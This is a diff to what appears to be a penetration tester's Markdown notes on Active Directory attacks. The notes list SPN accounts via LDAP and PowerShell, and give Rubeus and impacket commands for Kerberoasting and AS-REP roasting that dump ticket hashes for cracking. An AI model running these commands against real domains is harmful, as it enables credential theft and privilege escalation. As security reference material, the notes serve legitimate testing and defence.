@@ -2,6 +2,50 @@ Windows
 =======
 
 
+### List SPN accounts
+
+An account can be used to executes features (Service) on a server. Theses features
+are calls SPNs and are represented as follow:
+
+```
+service-class/hostname-FQDN(:port)(/arbitrary-name)
+```
+
+More details are available on the [Microsoft documentation](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc772815(v=ws.10)#service-principal-names)
+
+The following LDAP query lists the accounts with a SPN on the domain:
+
+```ldap
+&(objectCategory=person)(objectClass=user)(servicePrincipalName=*)
+```
+
+With Powershell, the script is the following:
+
+```powershell
+$users = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=person)(objectClass=user)(servicePrincipalName=*))")).FindAll()
+```
+
+
+### Kerberoast
+
+The Kerberoast attack consist on asking a TGS for a specific SPN then brute-force
+the hash to recover the account password.
+With the list of SPN account, the attacker is going to target accounts with
+privileges. The success of this attack depends on the company password policy.
+
+[Rubeus](https://github.com/GhostPack/Rubeus) dumps the hash of a target SPN account:
+
+```bash
+Rubeus.exe kerberoast /creduser:"<fqdn_dom>\<user>" /credpassword:"<password>" /domain:"<fqdn_dom>" /outfile:"kerberoast.hash.txt"
+```
+
+You can also use the `impacket` script [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
+to get the hash in a format that `John` or `Hashcat ` can brute-force:
+
+```bash
+python GetUserSPNs.py <domain_name>/<domain_user>:<domain_user_password> -format <john/empty> -outputfile hashes.txt
+```
+
 ### KerberosUnConstrainedDelegation
 
 More information [here](https://adsecurity.org/?p=1667)
@@ -27,11 +71,6 @@ There are two Bitwise operation Extensible Match Rules.
 
 ![](https://adsecurity.org/wp-content/uploads/2015/08/KerberosUnConstrainedDelegation-PowerShell-DiscoverServers2.png)
 
-With [Rubeus](https://github.com/GhostPack/Rubeus), it's possible to dump the hashes:
-
-```bash
-Rubeus.exe kerberoast /creduser:"<fqdn_dom>\<user>" /credpassword:"<password>" /domain:"<fqdn_dom>" /outfile:"kerberoast.hash.txt"
-```
 
 
 ### Kerberos preauthentication
@@ -50,7 +89,7 @@ $users = (New-Object System.DirectoryServices.DirectorySearcher("(&(objectCatego
 ```
 
 Then you can use the `impacket` script [`GetNPUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py)
-to get the TGT in a format the `John` or `Hashcat ` can brute-force:
+to get the TGT in a format that `John` or `Hashcat ` can brute-force:
 
 ```bash
 python GetNPUsers.py <domain>/ -usersfile users.txt -format <john/empty> -outputfile hashes.txt
@@ -69,6 +108,7 @@ foreach ($object in $objects) { $object }
 
 
 ### Collect AD users information
+
 ```powershell
 # Helping functions
 function Get-ADUserDirectoryEntry($user) {
@@ -99,9 +139,6 @@ function Get-ADGroupMembers($GroupName) {
 # Get "Domain admins" users, be carefull the name may change depending on the DC lang
 $DomainAdmins = Get-ADGroupMembers("Domain Admins")
 foreach($user in $DomainAdmins) { echo "$($user.displayname) ($($user.samaccountname))" }
-
-#
-(New-Object System.DirectoryServices.DirectorySearcher("(&(objectCategory=Computer)(cn=SCU44625))")).FindAll()
 ```
 
 
